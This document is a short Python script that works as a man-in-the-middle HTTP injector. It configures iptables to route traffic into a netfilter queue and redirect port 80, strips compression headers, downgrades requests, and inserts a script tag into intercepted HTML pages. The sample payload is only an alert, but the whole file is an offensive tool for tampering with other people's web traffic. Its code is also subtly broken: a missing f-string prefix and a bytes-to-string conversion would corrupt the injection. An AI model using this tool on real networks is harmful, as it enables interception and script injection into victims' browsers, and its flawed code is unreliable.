#!/usr/bin/env python

import subprocess
import netfilterqueue
import scapy.all as scapy
import re


def iptables():
    subprocess.call(["iptables", "-I", "OUTPUT", "-j",
                     "NFQUEUE", '--queue-num', "0"])
    subprocess.call(["iptables", "-I", "INPUT", "-j",
                     "NFQUEUE", '--queue-num', "0"])
    subprocess.call(["iptables", "-t", "nat", "-A",
                     "PREROUTING", '-p', "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"])


def iptables_flush():
    subprocess.call(["iptables", "--flush"])


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    http_packet = scapy.IP(packet.get_payload())
    if http_packet.haslayer(scapy.Raw):
        load = str(http_packet[scapy.Raw].load)
        if http_packet.haslayer(scapy.TCP):
            if http_packet[scapy.TCP].dport == 10000:
                print("HTTP Request...")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                load = load.replace("HTTP/1.1", "HTTP/1.0")
                new_packet = set_load(http_packet, load)
                packet.set_payload(bytes(new_packet))

            elif http_packet[scapy.TCP].sport == 10000:
                print("HTTP Response...")
                inject_code = "<script>alert('hello')</script>"
                load = load.replace(
                    "</body>", "{inject_code}</body>")
                content_length_re = re.search(
                    "(?:Content-Length:\s)(\d*)", load)
                if content_length_re and "text/html" in load:
                    content_length = content_length_re.group(1)
                    new_length = int(content_length) + len(inject_code)
                    load = load.replace(content_length, str(new_length))
                    new_packet = set_load(http_packet, load)
                    packet.set_payload(bytes(new_packet))

    packet.accept()

try:
    iptables()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\nFlushing ipatables...")
    iptables_flush()
